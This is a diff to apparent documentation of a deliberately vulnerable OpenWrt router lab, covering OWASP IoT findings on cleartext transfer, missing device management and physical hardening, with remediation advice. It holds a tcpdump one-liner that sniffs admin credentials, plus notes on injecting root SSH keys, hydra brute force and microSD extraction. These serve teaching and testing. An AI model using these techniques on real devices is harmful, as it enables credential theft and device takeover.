+uhttpd is configured for plain HTTP only (`30-uhttpd-config.sh` sets `listen_http` on `:80`, no `listen_https` and no TLS certificate), so the admin login crosses the wire in cleartext. A passive sniffer on the LAN recovers the credentials and the session cookie:
+
+```shell
+tcpdump -i eth0 -A -s0 'tcp port 80' | grep -A2 luci_username
+# ... luci_username=root&luci_password=uncrackable
+# Set-Cookie: sysauth=<session>
+```
+
+The same holds for every other service the lab exposes: FTP (`:21`), SNMP v1/v2c (`:161`, community string and data), and the hidden Telnet root shell (`:5515`) are all plaintext. The `support/remote` SSH-key POST (see IoT5) also travels in cleartext, so the injected key and the spoofed support IP are sniffable.
+
+### At rest: world-modifiable state and plaintext logs (CWE-312 / CWE-732)
+
+dnsmasq keeps its live DHCP database in `/tmp`, world-modifiable by design:
+
+```
+dhcp-leasefile=/tmp/dhcp.leases
+dhcp-hostsfile=/tmp/hosts
+```
+
+Any local process can rewrite the lease table or the hosts file with no privileges (the lease-injection and hosts-poisoning repros are in the DHCP/DNS section). DNS queries are logged in cleartext to `/var/log/dnsmasq.log` (`log-queries`), exposing the browsing history of every client.
+
+Several components also write sensitive data to predictable, low-privilege paths:
+
+| Path | Written by | Contents |
+|------|-----------|----------|
+| `/tmp/support_env_debug.log` | `support/remote.lua` | full request environment, including spoofed support IPs |
+| `/var/log/support_access.log` | `support/remote.lua` | every access, the forwarded IP, and injected-key prefixes |
+| `/etc/dropbear/authorized_keys` | `support/remote.lua` | attacker-injected root keys (see IoT5) |
+| `/root/vulnzoo.log` | provisioning hooks | account-creation trace |
+
+### Impact and remediation
+
+Any unprivileged LAN position recovers admin credentials, session cookies and DNS history by sniffing, and any local account can read the debug/access logs or rewrite the DHCP state. Remediation: serve LuCI over HTTPS (redirect `:80` -> `:443`) and drop the plaintext services, move DHCP state off `/tmp` to a root-only path, and stop writing request environments and key material to world-readable logs.
+
+**OWASP / CWE.** IoT7; CWE-319 Cleartext Transmission of Sensitive Information; CWE-312 Cleartext Storage of Sensitive Information; CWE-732 Incorrect Permission Assignment for Critical Resource.
 # IoT:I8 - Lack of device management
 ## Definition
 > Lack of security support on devices deployed in production, including asset management, update management, secure decommissioning, systems monitoring, and response capabilities.
-> **NOT DEVELOPED**
+> **DONE.** Management-layer synthesis of gaps demonstrated by the concrete findings cross-linked below (no new code).
+
+Device management is the lifecycle around a deployed device: updating it safely, watching it, responding to abuse, and decommissioning it. RoutCoon has none of these controls. Each gap below is demonstrated by a concrete finding elsewhere in this doc.
+
+### Update management
+
+The device cannot be updated securely. `opkg` runs with `check_signature 0`, and the `auto-updater.sh` cron executes unsigned scripts dropped over anonymous FTP, with no signature check, no anti-rollback, and no operator notification (see [[#IoT:I4 - Lack of Secure Update Mechanism|IoT4]]). An operator has no trustworthy inventory of what firmware or packages are actually installed.
+
+### No monitoring or response (CWE-778)
+
+There is no security monitoring, alerting, or response capability. The logs that do exist are unmanaged: DNS query logs and the DHCP state sit world-readable/writable in `/tmp`, and the `support/remote` access log records attacks in cleartext but nothing acts on them (see [[#IoT:I7 - Insecure Data Transfer and Storage|IoT7]]). Log tampering is trivial (the `/tmp` files), so even forensic value is limited.
+
+### No brute-force protection (CWE-307)
+
+No auth surface rate-limits or locks out. SSH accepts unlimited `hydra` runs against `openwrtuser` (see IoT2), the LuCI session setup has no throttling (see the API doc, API2), and the unauthenticated `api/*` and `tools/*` endpoints can be hammered freely. There is no detection or lockout on any of them.
+
+### No key or credential lifecycle / decommissioning
+
+Injected SSH keys persist in `/etc/dropbear/authorized_keys` with no rotation or review (see IoT5), hardcoded credentials never change, and there is no secure-wipe or decommissioning path, so a compromised device stays compromised.
+
+### Impact and remediation
+
+The device offers no way to detect, contain, or recover from compromise, and no way to trust its software supply chain. Remediation: signed updates with anti-rollback, centralized tamper-resistant logging with alerting, rate limiting and lockout on every auth surface, and a key/credential rotation plus secure-decommission process.
+
+**OWASP / CWE.** IoT8; CWE-778 Insufficient Logging; CWE-307 Improper Restriction of Excessive Authentication Attempts. The insecure update path is CWE-347 / CWE-494 (see IoT4).
 # IoT:I9 - Insecure Default Settings
 ## Definition
 > Devices or systems shipped with insecure default settings or lack the ability to make the system more secure by restricting operators from modifying configurations.
@@ -1038,7 +1131,7 @@ config dropbear
 
 An administrator can only obtain `root` access by first logging in via SSH as `openwrtuser` and then escalating privileges to `root` from within the session using `su` command.
 
-The primary risk in this scenario lies in the restricted shell assigned to the `openwrtuser` account. As previously demonstrated in the section [[IoT Vulnerabilities#IoT I1 - Weak, Guessable, or Hardcoded Passwords]], the user's password can be cracked using the username and a common brute-force dictionary. Additionally, physical access methods are possible, as detailed in [[IoT Vulnerabilities#IoT I10 - Lack of Physical Hardening]], and the firmware can also be obtained for further analysis ([see reference](https://github.com/scriptingxss/owasp-fstm)).
+The primary risk in this scenario lies in the restricted shell assigned to the `openwrtuser` account. As previously demonstrated in the section [[#IoT:I1 - Weak Guessable, or Hardcoded Passwords]], the user's password can be cracked using the username and a common brute-force dictionary. Additionally, physical access methods are possible, as detailed in [[#IoT:I10 - Lack of Physical Hardening]], and the firmware can also be obtained for further analysis ([see reference](https://github.com/scriptingxss/owasp-fstm)).
 
 Once access is gained, a user can analyze the behavior of the deployed shell. This can be achieved by reviewing the source code in the repository or by locating and extracting the binary for reverse engineering. The _rshell_ implementation permits the execution of the `awk` command without proper validation.
 
@@ -1126,12 +1219,12 @@ udp        0      0 :::547                  :::*                                
 
 ### FTP configuration and escalation
 
-There are multiple insecure configurations present on the device, one of the most critical being the configuration of the [[IoT Vulnerabilities#FTP|FTP]] service. This service allows any user logging in as _anonymous_ to upload executable files to the _/tmp_ directory. This creates a significant attack surface for the execution of malware or ransomware.
+There are multiple insecure configurations present on the device, one of the most critical being the configuration of the [[#2.4 FTP|FTP]] service. This service allows any user logging in as _anonymous_ to upload executable files to the _/opt/oem-updates/pending_ directory. This creates a significant attack surface for the execution of malware or ransomware.
 
 To mitigate this issue, it is recommended to create a dedicated directory for the FTP service, restrict access to prevent anonymous logins, and mount the directory used for file uploads with the _noexec_ option to prevent execution of uploaded files.*
 
 ```zsh
-mount -o remount,noexec /tmp/ftp
+mount -o remount,noexec /opt/oem-updates/pending
 ```
 ### Exposed services running as root
 
@@ -1139,4 +1232,26 @@ There are services on the router that run under the `root` user, which opens a v
 ## IoT:I10 - Lack of Physical Hardening
 ### Definition
 > Lack of physical hardening measures, allowing potential attackers to gain sensitive information that can help in a future remote attack or take local control of the device.
-> **NOT DEVELOPED**
+> **DONE.** Scoped to the Raspberry Pi hardware the lab runs on; exploitation needs physical access, so the repro is on-device.
+
+The lab runs on a Raspberry Pi with no physical hardening: no secure boot, an unencrypted microSD rootfs, and an exposed UART. Physical access converts directly into persistent root.
+
+### microSD extraction (unconditional)
+
+The Pi boots from a removable microSD with no disk encryption. Pulling the card and mounting it on any machine gives full read/write access to the rootfs:
+- read `/etc/shadow` (the `openwrtuser` hash cracks, see [[#IoT:I1 - Weak Guessable, or Hardcoded Passwords|IoT1]]) and every hardcoded secret in the overlay,
+- plant persistence (drop a key into `/etc/dropbear/authorized_keys`, or edit a `profile-init.d` hook) and boot the card back up as root.
+
+This is the physical mechanism behind the firmware-extraction step IoT1 assumes: `binwalk` on the image and offline hash cracking both start from the card.
+
+### UART serial console
+
+The Pi exposes a UART on the GPIO header (pins 8/10). A USB-TTL adapter at 115200 baud shows the bootloader and kernel boot log (which can leak configuration) and reaches the login console. The lab sets `ttylogin=1` (`50-ttylogin.sh`), so the serial getty asks for a password rather than dropping a free shell, but the boot output is still exposed, the bootloader can be interrupted, and the card-extraction path above bypasses the login entirely.
+
+### Impact and remediation
+
+Physical access to the device yields the full filesystem, all secrets, and persistent root, with no cryptographic barrier. Remediation: enable secure boot and rootfs encryption, disable the serial console (or set a bootloader password), and use tamper-evident enclosures.
+
+**On-device note.** These are hardware findings and cannot be reproduced from the overlay alone. microSD extraction is unconditional (no encryption in the image), while the exact serial-console behavior (getty vs an interruptible bootloader prompt) should be confirmed on the physical Pi.
+
+**OWASP / CWE.** IoT10; CWE-1263 Improper Physical Access Control; CWE-1191 Exposed Debug/Test Interface (UART).
